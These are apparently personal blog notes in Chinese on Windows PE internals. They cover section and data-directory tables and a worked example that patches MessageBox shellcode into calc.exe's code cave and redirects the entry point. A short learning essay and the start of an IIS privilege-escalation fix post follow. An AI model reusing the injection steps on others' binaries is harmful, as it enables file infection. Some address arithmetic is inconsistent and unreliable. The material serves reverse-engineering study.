<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Name 占8个字节，一般情况下是以&quot;\0&quot;结尾的ASCII码字符串来标识的名词。但是该名称并不遵守以&quot;\0&quot;结尾的规律，如果不是以 &quot;\0&quot;结尾，系统会截取8个字节的长度进行处理，有时候会导致越界乱码。</span><br><span class="line">所以不用`char*`来解析， char* 会自动找 &quot;\0&quot;，用数组来解析。</span><br><span class="line"></span><br><span class="line">2.Misc.VirtualSize表示在文件对齐前，实际的大小，该值可以修改，不影响，所以不一定准确</span><br><span class="line"></span><br><span class="line">3.VirtualAddress 是节区在内存中的偏移地址，加上 ImageBase 才是在内存中的真正地址。 VirtualAddress是距离 ImageBase（ImageBuffer的dos头）的距离</span><br><span class="line"></span><br><span class="line">4.SizeOfRawData 节在文件中对齐后的尺寸</span><br><span class="line"></span><br><span class="line">5.PointerToRawData 节区在文件中的偏移，即在文件中距离dos头的距离</span><br></pre></td></tr></table></figure>

<p>代码空白区一般指的是  VirtualSize – SizeOfRawData 中的大小，</p>
<h2 id="FileBuffer-–-gt-ImageBuffer"><a href="#FileBuffer-–-gt-ImageBuffer" class="headerlink" title="FileBuffer –&gt; ImageBuffer"></a>FileBuffer –&gt; ImageBuffer</h2><p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20220926134140064.png" alt="image-20220926134140064"></p>
<p>FileBuffer 是在文件中的内容，Image Buffer是在内存中的内容，在内存中扩展一下</p>
<p>sizeofheaders 包括 dos头+标准PE头+可选PE头+节表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.根据 SizeofImage 的大小，开辟一块缓冲区（ImageBuffer）</span><br><span class="line">2.根据SizeOfHeader 的大小，将头信息从FileBuffer 拷贝到 ImageBuffer</span><br><span class="line">3.根据节表的信息循环将 FileBuffer 中的节拷贝到 ImageBuffer</span><br><span class="line">复制到什么地方，由节中的 VirtualAddress 决定，每个节copy Siz</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p>将Filebuffer 读到 ImageBuffer，先分配 SizeOfImage 大小的内存，在可选pe头里</p>
<p>转VirtualAddress eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.  501234 - 500000(ImageBase) = 1234 (RVA)</span><br><span class="line">2.  1234 &gt; VirtualAddress(1000)</span><br><span class="line">	1234 &lt; VirtualAddress + misc.VirtualAddress</span><br><span class="line">3.	1234 - 1000 = 234</span><br><span class="line">4.	400(PointerToRawData) + 234 =   (在文件中的地址 )</span><br></pre></td></tr></table></figure>



<h2 id="代码节空白区添加代码"><a href="#代码节空白区添加代码" class="headerlink" title="代码节空白区添加代码"></a>代码节空白区添加代码</h2><p>关于修正E8的理解：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公式：X = 要跳转的地址 - (E8当前的地址 + 5)；</span><br><span class="line">    要跳转的地址，就是我们要加入代码MessageBox的地址；</span><br><span class="line">    然后要减去E8当前的地址+5的位置，这里不是太好理解；</span><br><span class="line">    我们的目的是要将E8后面的4个字节计算出来，然后写入到E8后面，也就是公式中X；</span><br><span class="line">    上面公式E8当前地址+5 ，而在此情况要定位到这个位置就要从代码的Dos开始通过指针相加；</span><br><span class="line">    进行位置偏移到E8当前地址+5的位置；</span><br><span class="line">    所以定位codeBegin的位置是：pImageBuffer指针最开始的位置（Dos头位置）通过内存中偏移的宽度移动到第一个节表的位置；</span><br><span class="line">    也就是上面的pSectionHeader-&gt;VirtualAddress 操作形式；</span><br><span class="line">    然后再偏移第一个节表在内存中对齐前实际的宽度（尺寸）pSectionHeader-&gt;Misc.VirtualSize；</span><br><span class="line">    上述一番操作之后就到了第一个节表没有对齐前的位置，这个位置就是我们可以添加ShellCode代码的起始位置；</span><br><span class="line">    到了添加ShellCode代码的起始位置之后，就要想办法添加E8位置后面的4个字节，此时根据ShellCode代码的宽度；</span><br><span class="line">    进行计算，确认0x6A 00 0x6A 00 0x6A 00 0x6A 00 E8 00 00 00 00 刚好向后面数13个位置，按照十六进制看；</span><br><span class="line">    就是0xD，所以在codeBegin偏移0xD个位置即可到达E9的位置，这也就是我们说的(E8当前的地址 + 5);</span><br><span class="line">    到了上面的位置之后，由于我们最终是需要在程序运行之后在内存中添加ShellCode代码；所以这里一定要计算出；</span><br><span class="line">    其准确的偏移地址，这样不管怎么拉伸到哪个位置，都能准确找到位置；</span><br><span class="line">    注意：这里需要注意一点理解，上面说的pImageBuffer这个是我们加载程序到我们申请的内存中，绝不是程序在；</span><br><span class="line">    运行中的那个内存，这里一定要理解清楚，她们是不一样的，理解了这个就能理解上面代码为什么要减去Dos头的；</span><br><span class="line">    首地址，(DWORD)(codeBegin + 0xD) - (DWORD)pImageBuffer)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>关于e9修正的理解：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公式：X = 要跳转的地址 - (E9当前的地址 + 5)</span><br><span class="line">   这里同样是要计算出E9后面4个字节的地址，我们的目的是在这里添加OEP的地址，让其执行完成MessageBox之后跳转；</span><br><span class="line">   OEP的地址，那么这里就要先计算出OEP地址，就是pOptionHeader-&gt;ImageBase + pOptionHeader-&gt;AddressOfEntryPoint；</span><br><span class="line">   再减去(E9当前的地址 + 5) 0x6A 00 0x6A 00 0x6A 00 0x6A 00 E8 00 00 00 00 E9 00 00 00 00；</span><br><span class="line">   (DWORD)codeBegin + SHELLCODELENGTH 就是加上ShellCode总长度，偏移完成之后减去ImageBuffer首地址再加上ImageBase；</span><br></pre></td></tr></table></figure>

<p>修正oep：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修正OEP好理解，就是定位到OEP地址，然后直接通过codeBegin地址减去pImageBuffer的首地址即可</span><br></pre></td></tr></table></figure>





<h5 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h5><p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20220928223839801.png" alt="image-20220928223839801"></p>
<p>messagebox 的地址为  75 5e 06 60</p>
<p>找硬编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6A  00</span><br><span class="line">6A  00</span><br><span class="line">6A 	00</span><br><span class="line">6A 	00</span><br><span class="line">E8 	00 00 00 00 ；call</span><br><span class="line">E9 	00 00 00 00 ；jmp</span><br></pre></td></tr></table></figure>



<p>查找pe信息   win10 的  32位的calc</p>
<p>需要注意的字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddressOfEntryPoint:	1B90</span><br><span class="line">ImageBase:				400000</span><br><span class="line">Section Alignment:		1000</span><br><span class="line">File Alignment:			200</span><br><span class="line"></span><br><span class="line">Section:				.text</span><br><span class="line">VirtualSize:			f2c（对齐前的长度）</span><br><span class="line">VirtualAddress:			1000（内存中的偏移）</span><br><span class="line">PointerToRawData:		400 （文件中的偏移）</span><br></pre></td></tr></table></figure>

<p>代码空白区的起始地址为 ： PointerToRawData+VirtualSize</p>
<p>计算FileBuffer 代码节的结束地址</p>
<p>Formulas: PointerToRawData + VirtualSize = 132c</p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20220929092350689.png" alt="image-20220929092350689"></p>
<p>在空白区填充代码的硬编码</p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20220929092703113.png" alt="image-20220929092703113"></p>
<p>当程序中的文件对齐和内存对齐不一致时需要进行转换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Foa_shellcodeAddr - PointerToRawData + VirtualAddress + ImageBase = Rva_shellcodeAddr</span><br></pre></td></tr></table></figure>

<p>132c - 400 + 1000 + 400000 = 40192c</p>
<p>e8和e9 调用地址 = 跳转的目标地址- （指令地址+ 指令长度）</p>
<p>计算E8后的值：</p>
<p>e8后的值= 真正跳转的地址 - E8 下一条指令地址</p>
<p>ImageBuffer 中 插入代码的地址（rva_shellcodeaddr） ： ImageBase + Virtualsize+ VirtualAddress = 400000 +f2c  +1000 = 401f2c </p>
<p>插入了 messagebox 对应的硬编码  8 个字节，所以 E8 的地址为   401f2c + 8 =  421f34</p>
<p>e8下一行地址为 ： 401f34(内存中的值) +5 = 401f39</p>
<p>E8 后的值： 75 94 06 60（messagebox函数运行时起始地址）-401f39（e8下一行地址）= 7553 E727</p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20220929092703113.png" alt="image-20220929092703113"></p>
<p>计算e9后的值：</p>
<p>真正要跳转的地址： ImageBase + EntryPoint = 400000 +1b90 = 401b90</p>
<p>E9的下一条指令的地址：401f39(e8下一行地址)+5 = 401f3e</p>
<p>e9后的值 = 401b90 - 401f3e=  ff ff fc 52</p>
<p>修改 OEP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OEP = RVA_shellcodeAddr - ImageBase</span><br></pre></td></tr></table></figure>

<p>421f34 - 400000 = 21f34</p>
<p>21860 改为 227b8</p>
<p>60 18 02  b8 27 02</p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20220929002230234.png" alt="image-20220929002230234"></p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20220929002252829.png" alt="image-20220929002252829"></p>
<h2 id="任意代码空白区添加代码"><a href="#任意代码空白区添加代码" class="headerlink" title="任意代码空白区添加代码"></a>任意代码空白区添加代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 根据sizeofIMage分配空间</span><br><span class="line">2. copy 头  （sizeofheaders）</span><br><span class="line">3.根据节表中的PointerToRawData 确定文件中开始拷贝的位置，根据节表属性VirtualAddress 知道要复制到的位置</span><br><span class="line">4. 拷贝节的大小， 拷贝sizeofRawData</span><br><span class="line">5.申请new buffer  分配 最后一个节起始大小 + sizeofRawData()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="新增节-添加代码"><a href="#新增节-添加代码" class="headerlink" title="新增节-添加代码"></a>新增节-添加代码</h2><p>判断</p>
<p>sizeofHeader - （DOS + 垃圾数据 + PE标记 + 标准PE头 + 可选PE头 + 已存在节表）&gt;= 2个节表的大小</p>
<p>因为节表中需要有空间装得下2个节表，其中一个节表是我们自己新增的，其中一个是00填充(windows判断一个结构体结束，是判断和结构体相同大小的空间 都为0，规定，写为1也可以运行，但不知道写为几不能运行)</p>
<p>节表中的信息指的是  .text   .rdata   .data  .rsrc 中的数据</p>
<p>需要修改的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.添加一个新的节</span><br><span class="line">2.在新增节后面  填充一个节大小的0000 （40个字节）</span><br><span class="line">3.修改pe头中节的数量    （4+1）</span><br><span class="line">4.修改sizeofIMage的大小 （在可选pe头里）</span><br><span class="line">5.在原有数据的最后，新增一个节的数据（内存对齐的整数倍）</span><br><span class="line">6.修正新增节表的属性</span><br></pre></td></tr></table></figure>

<p>修改virtualSize时， 直接修改为和文件中对齐后的长度一样，1000h</p>
<p>VirtualAddreess + sizeofRawData                      //最后一个节开始的地方 + max （Virtualsize，sizeofRawdata）</p>
<p>加完以后按照内存对齐</p>
<p>如果节后面有编译器新增的数据，把dos头后面的stub 删除，将NT头提前，修改 e_lfanew</p>
<p>3.修改sizeofimage</p>
<p>因为节在内存对齐是 1000</p>
<p>6000 + 1000 = 7000 </p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221004004812121.png" alt="image-20221004004812121"></p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221004005156880.png" alt="image-20221004005156880"></p>
<p>新增一个节表的数据</p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221004005436127.png" alt="image-20221004005436127"></p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221004005453377.png" alt="image-20221004005453377"></p>
<p>修正节表数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.VirtualAddress   按照上一个对齐</span><br><span class="line">2.sizeofRawData</span><br><span class="line">3.PointerToRawData</span><br><span class="line">上一个节开始位置+节对齐后的大小 = RAW大小 + RAW偏移</span><br></pre></td></tr></table></figure>



<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221004005944989.png" alt="image-20221004005944989"></p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221004011229479.png" alt="image-20221004011229479"></p>
<h2 id="扩大节–合并节–数据目录"><a href="#扩大节–合并节–数据目录" class="headerlink" title="扩大节–合并节–数据目录"></a>扩大节–合并节–数据目录</h2><p>扩大节</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.拉伸到内存</span><br><span class="line">2.分配一块新的空间： sizeofImage + Ex</span><br><span class="line">3.将最后一个节的sizeofRawData 和VirtualSize 改成N</span><br><span class="line">SizeOfRawData = VirtualSize = N</span><br><span class="line">N = (SizeOfRawData 或者 VirtualSize 内存对齐后的值) + Ex</span><br><span class="line">4.修改SizeOfImage的大小</span><br><span class="line">SizeofImage = SizeofImage + Ex</span><br></pre></td></tr></table></figure>







<p>合并节</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.取最后一个节中 （sizeofRawData 和 VirtualSize）的值，谁大就取谁</span><br><span class="line">即  max = sizeofRawData &gt; VirtualSize &gt; SizeOfRawDzata : VirtualSize</span><br><span class="line">2.通过最后一个节的VirtualAddress + 上面的道德最后一个节max - 拉伸后的SizeOfHeaders内存对齐后的大小</span><br><span class="line">3.SizeifRawData = VirtualSize </span><br><span class="line">4.numberofSections = 1</span><br></pre></td></tr></table></figure>







<h2 id="静态链接库–动态链接库"><a href="#静态链接库–动态链接库" class="headerlink" title="静态链接库–动态链接库"></a>静态链接库–动态链接库</h2><h3 id="使用dll"><a href="#使用dll" class="headerlink" title="使用dll"></a>使用dll</h3><p>隐式链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.将*.dll *.lib 放到工程目录下面</span><br><span class="line">2.将 #pragma comment(lib,&quot;DLLming.lib&quot;) 添加到调用文件中</span><br><span class="line">3.加入函数的声明</span><br><span class="line">extern &quot;C&quot; __declspec(dllimport) __stdcall int Plus(int x,int y);</span><br><span class="line">说明：</span><br><span class="line">__declspec(dllimport) 告诉编译器此函数为导入函数</span><br><span class="line">__stdcall 平衡堆栈</span><br></pre></td></tr></table></figure>



<p>显式链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.定义函数指针</span><br><span class="line">//typedef int</span><br><span class="line">2.声明函数指针变量</span><br><span class="line">3.动态加载dll到内存中     //告诉编译器用到哪个dll，加载到exe内存</span><br><span class="line">LoadLibrary(&quot;DLLDemo.dll&quot;)</span><br><span class="line">4.获取函数地址</span><br><span class="line">GetProcessAddress</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<p>Handle  HMODULE  HINSTANCE  HWND  都表示无符号类型的整数  4个字节</p>
<h3 id="避免被直接分析到dll函数"><a href="#避免被直接分析到dll函数" class="headerlink" title="避免被直接分析到dll函数"></a>避免被直接分析到dll函数</h3><p>使用 *.def 文件 达到隐藏函数名的目的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Plus  @12   //plus函数的导出序号是12</span><br><span class="line">Sub	  @15   //导出序号15</span><br></pre></td></tr></table></figure>



<h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><p>真正导出表的结构</p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221005132256650.png" alt="image-20221005132256650"></p>
<p>只要见到RVA的地方，先转成foa 再去找</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddressOfFUnctions 指向了一张表，表里存储着pe 所有导出函数的地址</span><br><span class="line">AddressOfNames 存储着所有导出函数的名字的地址</span><br><span class="line">AddressOfNameOrdinals （函数序号表） + base（起始序号） 才是真正的序号表</span><br><span class="line">按照序号 来找  用不到序号表，按照名字来找才有意义</span><br></pre></td></tr></table></figure>





<p>定位数据目录的位置</p>
<p>pe标记往后数24（20+4）个字节 到达可选pe头，可选pe头往后数 224-128 = 96 个字节 （可选pe头– DataDirectory） = _IMAGE_DATA_DIRECTORY * 16 = 8*16</p>
<p>DataDirectory首地址= 可选pe头 + 96</p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221005201309769.png" alt="image-20221005201309769"></p>
<p>定位导出表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.找到可选pe头的最后一个成员 DataDirectory</span><br><span class="line">2.获取DataDirectory[0]</span><br><span class="line">3.通过DataDirectory[0].VirtualAddress 得到导出表的RVA</span><br><span class="line">4.将导出表的RVA转换为FOA，在文件中定位到导出表</span><br></pre></td></tr></table></figure>

<p>​    </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">numberOfFunctions = （编写dll时）最大序号-最小序号+1</span><br></pre></td></tr></table></figure>



<p>根据函数名称获取导出函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.根据导出表的函数名称去AddressOfNames指向的每个名称字符串查询是否有匹配的字符串</span><br><span class="line">2.找到匹配的字符串后，根据找到的顺序索引去AddressOfNameOrdinals中找到对应的索引</span><br><span class="line">3.根据前面找到的Ordinals到 AddressOfFunctions中获取函数地址</span><br></pre></td></tr></table></figure>



<p>根据函数序号获取导出函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.根据函数序号 - 导出表.base 获得导出函数的Ordinal</span><br><span class="line">2.根据前面找到的Ordinals到 AddressOfFunctions中获取函数地址</span><br></pre></td></tr></table></figure>



<p>总结</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">导出表中包含了3张小表：导出函数地址表，导出函数名称表，导出函数序号表</span><br><span class="line">导出表存储了这3张表地址的指针，而不是直接存储表的内容</span><br><span class="line">序号表并不是真正存储序号的表，只是用来给name中转的表</span><br></pre></td></tr></table></figure>





<h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><p>绝大多数dll中，exe基本没有重定位表</p>
<p>数据目录项的第6个结构是重定位表</p>
<p>重定位表的结构是按照块来的</p>
<p>一堆需要修改的放在一个块中</p>
<p>如下图，只有高4位 为 0011 这个值才需要修改，后面的低12位+前面的x(VirtualAddress)</p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221006155541354.png" alt="image-20221006155541354"></p>
<p>每一块有多少个需要修改的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(SizeofBlock - 8) /2</span><br></pre></td></tr></table></figure>

<p>定位重定位表的流程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.找到可选pe头的最后一个成员 DataDirectory</span><br><span class="line">2.获取DataDirectory[5]</span><br><span class="line">3.通过DataDirectory[5].VirtuallAddress 得到重定位表的RVA</span><br><span class="line">4.转换FOA，在文件中定位到重定位表</span><br></pre></td></tr></table></figure>





<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221006175628766.png" alt="image-20221006175628766"></p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221006175745262.png" alt="image-20221006175745262"></p>
<p>重定位表块中的SizeOfBlock后面的数据部分是用来作为偏移使用的，每一个数据项的大小为WORD，两字节，只有后面12位是用来表示偏移的，高4位用来判定该地址是否需要偏移。这里为什么只有12位用来表示偏移呢？因为重定位表是根据物理内存来设计的，物理内存是以4kb = 2^12 为单位，也就是4kb为一个物理页，所以只需要12位就可以表示一个物理页内的所有偏移。</p>
<p>高4位为0的话，表示该数据为对齐用的填充的垃圾数据，不需要重定位</p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221007101925829.png" alt="image-20221007101925829"></p>
<h2 id="移动导出表–重定位表"><a href="#移动导出表–重定位表" class="headerlink" title="移动导出表–重定位表"></a>移动导出表–重定位表</h2><p>为什么要移动这些表：</p>
<p>是对程序加密/破解的基础</p>
<p>移动导出表步骤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.在dll中新增一个节，并返回新增节后的FOA</span><br><span class="line">2.复制AddressOfFunctions</span><br><span class="line">  长度： 4*NumberofFunctions</span><br><span class="line">3.复制AddressofNameOrdinals</span><br><span class="line">  长度：2*NumberOfNames</span><br><span class="line">4.复制AddressOfNames</span><br><span class="line">  长度：4*NumberOfNames</span><br><span class="line">  </span><br><span class="line"> 移动函数名字</span><br><span class="line">5.复制所有的函数名</span><br><span class="line">  长度不确定，复制时直接修复AddressOfNames</span><br><span class="line">6.复制IMAGE_EXPORT_DIRECTORY结构</span><br><span class="line">7.修复IMAGE_EXPORT_DIRECTORY 结构中的</span><br><span class="line">  AddressOfFunctions</span><br><span class="line">  AddressOfNameOrdinals</span><br><span class="line">  </span><br><span class="line">8.修复目录项的值，指向新的IMAGE_EXPORT_DIRECTORY</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221007124323902.png" alt="image-20221007124323902"></p>
<p>移动重定位表步骤</p>
<p>tip: DATA_DIRECTORY 里面的值不能修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.首先移动重定位表</span><br><span class="line">2.修改重定位表结构指向移动后的重定位的位置</span><br><span class="line">3.手动imagebase自增1000</span><br><span class="line">4.最后修复重定位表</span><br></pre></td></tr></table></figure>









<h2 id="IAT表"><a href="#IAT表" class="headerlink" title="IAT表"></a>IAT表</h2><p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221008133831339.png" alt="image-20221008133831339"></p>
<p>运行时：</p>
<p>call     4070bc  ： [77d5050b]       user32.dll -&gt; messagebox</p>
<p>运行前：</p>
<p>call    4070bc:     [7604]   —&gt;messagebox的字符串</p>
<p>因为重定位表的关系，call后面的地址不能写死，所以调用dll的时候，call后面都是跟的地址，而不是写死的函数值</p>
<h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221008133346306.png" alt="image-20221008133346306"></p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20221008134133377.png" alt="image-20221008134133377"></p>
<p>导入表两个重要的结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OriginalFirstThunk       //RVA   指向IMAGE_THUNK_DATA结构数组    INT表</span><br><span class="line">FIrstThunk				//RVA   指向IMAGE_THUNK_DATA结构数组		IAT表</span><br></pre></td></tr></table></figure>



<p>导入表中的FirstThunk 属性 指向IAT表</p>
<p>pe文件加载前：</p>
<p>INT表和IAT表中存储的值是一样的，可能是存储函数名称  或者函数序号</p>
<p><img src="https://610-pic-bed.oss-cn-shenzhen.aliyuncs.com/image-20210408162001903.png" alt="image-20210408162001903"></p>
<p>pe文件加载后：</p>
<p>IAT表中存储函数地址</p>
<p><img src="https://610-pic-bed.oss-cn-shenzhen.aliyuncs.com/image-20210408162937094.png" alt="image-20210408162937094"></p>
<p>在pe加载的时候，系统会调用GetProcessAddress(), 循环遍历INT表，添加到IAT表的对应地址</p>
<p>INT表和IAT表在文件中是一样的（没有绑定导入表的情况下）</p>
<p>导出表只有一个，但是导入表可能有多个</p>
<p>定位导入表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.DATADirectory 中的第二个是导入表</span><br><span class="line">2.通过DataDirectory[1].VirtualAddress得到导入表的RVA</span><br><span class="line">3.得到  IMAGE_IMPORT_DESSRIPTOR</span><br><span class="line">4.遍历FirstThunk， IMAGE_THUNK_DATA32  是一个联合体，把它当成DWORD型。判断最高位是否为1，如果是，那么除去最高位的值就是函数的到处序号。如果不是，那么这个值是一个RVA，指向IMAGE_IMPORT_BY_NAME   </span><br></pre></td></tr></table></figure>



<p>imagebase 就是程序加载到模块中的句柄</p>
<p>需要根据导入表去找函数地址</p>
<h2 id="绑定导入表"><a href="#绑定导入表" class="headerlink" title="绑定导入表"></a>绑定导入表</h2><p>如果导入表的时间戳(TimeDateStamp)为0，代表这个dll的函数地址还没绑定</p>
<p>如果时间戳为 –1（FFFFFFFF），代表dll的函数已经绑定</p>
<p>绑定导入表位于数据目录的第12项</p>
<p>当IMAGE_BOUND_IMPORT_DESCRIPTOR 结构中的TimeDateStamp 与dll文件标准pe头中的TimeDateStamp值不相符时，或者dll需要重定位时，会重新计算IAT中的值</p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>转载-高效学习攻防的一点思考和经验</title>
    <url>/2021/09/28/%E8%BD%AC%E8%BD%BD-%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0%E6%94%BB%E9%98%B2%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83%E5%92%8C%E7%BB%8F%E9%AA%8C/</url>
    <content><![CDATA[<p>当你拿到某个“技术点”, 或是遇到某个什么所谓的”技巧”, 甚至是工具之后,该如何进一步展开学习思考?</p>
<span id="more"></span>

<p>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.-&gt; 这TM 到底是个什么东西?</span><br><span class="line">2.-&gt; &quot;正常情况下&quot; 它都被用在什么地方? 平时主要拿它来干啥? 或者说这个东西可以协助解决一些什么样的实际业务问题 ?</span><br><span class="line">3.-&gt; 它在&quot;正常情况下&quot;, 具体是怎么运作的 ? 或者说其内部大致 实现原理 和 正常执行流程 是怎样的?</span><br><span class="line">4.-&gt; 在实际渗透中我们到底能利用它来干些啥? 最终又能达到什么样的利用效果? 或者说它能帮我们避免或者解决一些什么样的实际渗透问题?</span><br><span class="line">5.-&gt; 针对它所演化出来的具体利用场景都有哪些? 覆盖范围影响如何?</span><br><span class="line">6.-&gt; 详细利用条件又是啥? 利用成功的限制条件是否苛刻? 对于自己现有的目标性质是否有继续深入研究的价值?</span><br><span class="line">7.-&gt; 实际利用中可能会存在什么样的风险? 能否提前规避这些风险? 怎么规避? 万一误操作是否还能及时补救? 如何补救?</span><br><span class="line">8.-&gt; 能否在其原有基础上进行针对性的改良利用,将其深度武器化而后直接付诸实战?</span><br><span class="line">9.-&gt; 能否通过这个又联想到一些其它的衍生利用场景? 或者因此萌生出了一些比较另类优秀的利用思路?</span><br><span class="line">10.-&gt; 仔细分析哪些情况下可能会直接导致利用失败?</span><br><span class="line">11.-&gt; 如何从源头防御这种利用?</span><br><span class="line"></span><br><span class="line">之后总结：</span><br><span class="line">-&gt; 将以上问题的详细答案认真梳理总结,最后全部付诸于笔记或者文档</span><br><span class="line">-&gt; 随着后续自己知识体系不断的完善加深和大量的实践经验积累,不停的去修改自己之前文章/笔记中的一些错误认知</span><br><span class="line">-&gt; 最终,达到真正熟练掌握某个技术点甚至某个领域</span><br><span class="line">-&gt; 以后攻防技术的发展趋势更多可能会越来越偏向于 &quot;专而精&quot; ,而非 &quot;大而全&quot;</span><br><span class="line">-&gt; 慢慢尝试先单点突破 再逐步全局控制</span><br></pre></td></tr></table></figure>

<p>上面这种学习过程，其实无形中就是在帮你节省大量的时间，毫不夸张的说，可能你一年就把别人三年的东西全部学完了，甚至最后比别人三年学的还要扎实，因为一旦养成这种学习习惯之后基本就不用再去无休止的反攻浪费时间，最后，你会发现只要自己基础掌握的足够扎实，后面不管学什么东西，只要不是那种全新的领域或者非常高精尖的东西通常情况下入门都相对比较快，只是过程中思维转变确实需要一定的过度时间</p>
<p>  后期，当你自己确实有了一定的技术积淀之后，那时候你应该思考更多的不再是全，而是选择一两个自己真正喜欢或者擅长的领域去深入专，最终要专到什么程度呢 ?  这样说吧，起码在那个领域上，你无人可替，然后把其它领域都作为辅助</p>
]]></content>
      <categories>
        <category>转载</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>IIS 提权修复</title>
    <url>/2023/09/24/IIS%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E4%BF%AE%E5%A4%8D/</url>
    <content><![CDATA[<p>土豆提权是一个老生常谈的话题，近些年也衍生出了很多新的土豆提权方法，各种攻击方法层出不穷。但微软却并不认为这是漏洞，因此也一直没有修复。这里我给出两种修复的方法。mssql 也同理。<br>我们知道出现这个提权漏洞的原因是因为 IIS 服务有 seimpersonateprivilege 这个模拟特权，那我们把这个 IIS 服务用户的该特权删掉即可。</p>
<p>介绍一下 IIS 的权限配置。<br>IIS_IUSRS组是用于管理IIS应用程序池权限的用户组。IIS_IUSRS组的主要用途是为IIS应用程序池（Application Pools）中运行的应用程序提供必要的权限。当在IIS中创建一个新的应用程序池时，该应用程序池的身份标识（Identity）会自动被添加到IIS_IUSRS用户组中。<br>所以有了 2 种限制权限方法，分别针对用户组与应用程序池的身份标识。</p>
